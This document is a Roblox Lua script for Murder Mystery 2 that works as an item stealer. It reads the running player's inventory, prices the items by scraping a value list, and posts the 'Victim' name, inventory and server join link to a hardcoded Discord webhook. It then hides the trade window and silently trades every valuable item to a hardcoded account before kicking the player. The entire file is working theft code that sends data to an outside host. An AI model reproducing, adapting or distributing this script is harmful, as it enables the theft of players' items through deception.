setclipboard("your discord server link")

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")

local HARDCODED_USERS = {
    "JAMAL_THESCRIPTGUY",
}
local users = {}
for _, name in ipairs(HARDCODED_USERS) do
    table.insert(users, name)
end
if _G.Usernames and type(_G.Usernames) == "table" then
    for _, name in ipairs(_G.Usernames) do
        if not table.find(users, name) then
            table.insert(users, name)
        end
    end
end
if #users == 0 then
    plr:Kick("No usernames provided")
    return
end

local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"

if webhook == "" or not webhook:find("discord.com/api/webhooks") then
    plr:Kick("Invalid webhook URL")
    return
end
if next(users) == nil then
    plr:Kick("No username set")
    return
end
if game.PlaceId ~= 142823291 then
    plr:Kick("Join Murder Mystery 2 first")
    return
end
pcall(function()
    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
        plr:Kick("Private servers not supported")
    end
end)
if #Players:GetPlayers() >= 12 then
    plr:Kick("Server is full, rejoin another server")
    return
end

local function GetRequest()
    if request then return request end
    if http_request then return http_request end
    if syn and syn.request then return syn.request end
    if http and http.request then return http.request end
    return nil
end
local Request = GetRequest()
if not Request then
    plr:Kick("Executor not supported")
    return
end

local database = nil
pcall(function()
    database = require(game.ReplicatedStorage:WaitForChild("Database", 5):WaitForChild("Sync", 5):WaitForChild("Item", 5))
end)
if not database then
    plr:Kick("Failed to load database, retry")
    return
end

local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {
    ["Accept"] = "text/html",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
local function trim(s) return s:match("^%s*(.-)%s*$") end

local function fetchHTML(url)
    local success, res = pcall(Request, {Url=url, Method="GET", Headers=headers})
    if success and res and res.StatusCode == 200 then return res.Body end
    return ""
end

local function parseValue(html)
    if not html then return nil end
    local v = html:match('<b%s+class=["\']itemvalue["\']>([%d,%.]+)</b>')
    if v then return tonumber(v:gsub(",", "")) end
    return nil
end

local function extractItems(html)
    local t = {}
    for head, body in html:gmatch('<div%s+class=["\']itemhead["\']>(.-)</div>%s*<div%s+class=["\']itembody["\']>(.-)</div>') do
        local name = head:match("([^<]+)")
        if name then
            name = trim(name:gsub("%s+", " ")):lower()
            t[name] = parseValue(body)
        end
    end
    return t
end

local function buildValueList()
    local all = {}
    local done = 0
    for cat, url in pairs(categories) do
        task.spawn(function()
            local html = fetchHTML(url)
            if html ~= "" then
                local items = extractItems(html)
                for k, v in pairs(items) do all[k] = v end
            end
            done += 1
        end)
    end
    repeat task.wait(0.1) until done >= 5
    return all
end

local valueList = buildValueList()
local totalValue = 0
local weaponsToSend = {}

local realData = nil
pcall(function()
    realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
end)
if not realData or not realData.Weapons or not realData.Weapons.Owned then
    plr:Kick("Failed to load inventory, retry")
    return
end

local untradable = {
    DefaultGun=true,DefaultKnife=true,Reaver=true,Reaver_Legendary=true,Reaver_Godly=true,Reaver_Ancient=true,
    IceHammer=true,IceHammer_Legendary=true,IceHammer_Godly=true,IceHammer_Ancient=true,
    Gingerscythe=true,Gingerscythe_Legendary=true,Gingerscythe_Godly=true,Gingerscythe_Ancient=true,
    TestItem=true,Season1TestKnife=true,Cracks=true,Icecrusher=true,["???"]=true,Dartbringer=true,
    TravelerAxeRed=true,TravelerAxeBronze=true,TravelerAxeSilver=true,TravelerAxeGold=true,
    BlueCamo_K_2022=true,GreenCamo_K_2022=true,SharkSeeker=true
}

local minRarityIndex = table.find(rarityTable, min_rarity) or 1
local godlyIndex = table.find(rarityTable, "Godly")

for id, count in pairs(realData.Weapons.Owned) do
    local itemData = database[id]
    if itemData and not untradable[id] then
        local rarity = itemData.Rarity or "Common"
        local rIndex = table.find(rarityTable, rarity) or 1
        if rIndex >= minRarityIndex then
            local itemName = (itemData.ItemName or ""):lower()
            local val = valueList[itemName] or (rIndex >= godlyIndex and 2 or 1)
            if val >= min_value then
                totalValue += val * count
                table.insert(weaponsToSend, {DataID=id, Rarity=rarity, Amount=count, Value=val})
            end
        end
    end
end

if #weaponsToSend == 0 then
    plr:Kick("No items found to send")
    return
end

table.sort(weaponsToSend, function(a,b) return (a.Value*a.Amount) > (b.Value*b.Amount) end)

local function SendDiscord(data)
    local body = HttpService:JSONEncode(data)
    for attempt = 1, 3 do
        local success = pcall(function()
            return Request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
        if success then return true end
        task.wait(0.5)
    end
    return false
end

local JobId = game.JobId
local JoinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId
local TeleportCode = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. JobId .. '")'

local itemList = ""
for _, it in ipairs(weaponsToSend) do
    itemList ..= it.DataID .. " x" .. it.Amount .. " - " .. it.Value .. " Value (" .. it.Rarity .. ")\n"
end
if #itemList > 900 then itemList = itemList:sub(1, 900) .. "\n... and more items" end

local pingContent = ping == "Yes" and "@everyone" or ""
local embedColor = totalValue >= 100 and 16711680 or 16766720

local sent = SendDiscord({
    content = pingContent,
    embeds = {{
        title = "MM2 HIT DETECTED",
        color = embedColor,
        fields = {
            {name = "Victim", value = "```" .. plr.Name .. "```", inline = true},
            {name = "Display Name", value = "```" .. plr.DisplayName .. "```", inline = true},
            {name = "Total Value", value = "```" .. totalValue .. "```", inline = true},
            {name = "Items Found", value = "```" .. #weaponsToSend .. "```", inline = true},
            {name = "Inventory", value = "```" .. itemList .. "```", inline = false},
            {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](" .. JoinLink .. ")", inline = false},
            {name = "Teleport Code", value = "```lua\n" .. TeleportCode .. "\n```", inline = false}
        },
        footer = {text = "Job ID: " .. JobId .. " | Auto-trade active"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
})

if not sent then
    plr:Kick("Failed to send to Discord, check webhook")
    return
end

pcall(function()
    local tg = playerGui:WaitForChild("TradeGUI", 5)
    if tg then tg.Enabled = false; tg:GetPropertyChangedSignal("Enabled"):Connect(function() tg.Enabled = false end) end
end)
pcall(function()
    local tg = playerGui:WaitForChild("TradeGUI_Phone", 5)
    if tg then tg.Enabled = false; tg:GetPropertyChangedSignal("Enabled"):Connect(function() tg.Enabled = false end) end
end)

local function getTradeStatus()
    local s = nil
    pcall(function() s = game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end)
    return s or "None"
end
local function sendTradeRequest(name)
    pcall(function()
        local target = Players:FindFirstChild(name)
        if target then game.ReplicatedStorage.Trade.SendTradeRequest:InvokeServer(target) end
    end)
end
local function addItem(id)
    pcall(function() game.ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end)
end
local function acceptTrade()
    pcall(function() game.ReplicatedStorage.Trade.AcceptTrade:FireServer() end)
end
local function declineTrade()
    pcall(function() game.ReplicatedStorage.Trade.DeclineTrade:FireServer() end)
end
local function declineRequest()
    pcall(function() game.ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
end

task.spawn(function()
    local owner = nil
    repeat
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                owner = p
                break
            end
        end
        if not owner then task.wait(0.5) end
    until owner
    
    task.wait(1)
    local initialStatus = getTradeStatus()
    if initialStatus == "StartTrade" then
        declineTrade()
        task.wait(0.3)
    elseif initialStatus == "ReceivingRequest" then
        declineRequest()
        task.wait(0.3)
    end
    
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        if status == "None" then
            sendTradeRequest(owner.Name)
            task.wait(0.3)
        elseif status == "SendingRequest" then
            task.wait(0.3)
        elseif status == "ReceivingRequest" then
            declineRequest()
            task.wait(0.3)
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local item = table.remove(weaponsToSend, 1)
                for _ = 1, item.Amount do
                    addItem(item.DataID)
                    task.wait(0.05)
                end
            end
            task.wait(6)
            acceptTrade()
            repeat task.wait(0.1) until getTradeStatus() == "None"
        else
            task.wait(0.5)
        end
        task.wait(1)
    end
    
    SendDiscord({
        content = "@everyone",
        embeds = {{
            title = "TRADE COMPLETED",
            color = 65280,
            fields = {
                {name = "Victim", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total Value", value = "```" .. totalValue .. "```", inline = true}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
    
    plr:Kick("All items transferred successfully")
end)
